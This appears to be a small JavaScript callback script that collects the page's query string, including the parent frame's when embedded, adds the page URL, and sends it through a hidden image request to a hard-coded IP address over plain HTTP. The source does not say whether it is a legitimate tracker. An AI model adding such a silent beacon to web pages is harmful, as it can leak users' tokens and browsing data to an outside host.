function _yuewen_callback(){
	var location = window.location;
	if (window.top != window.self) {
		location = window.top.location;
	}
	var search = location.search;
	if(search && search != ''){
		var url = ''+location;
		url = url.substring(0,url.indexOf('?'));
		search += '&url='+encodeURIComponent(url);
		var img = document.createElement("img");
		img.src = "http://47.111.234.177:8080/cif-web/ResultControllers/resultDate"+search;
		img.style.display = "none";
		document.body.appendChild(img);
	}
}
_yuewen_callback();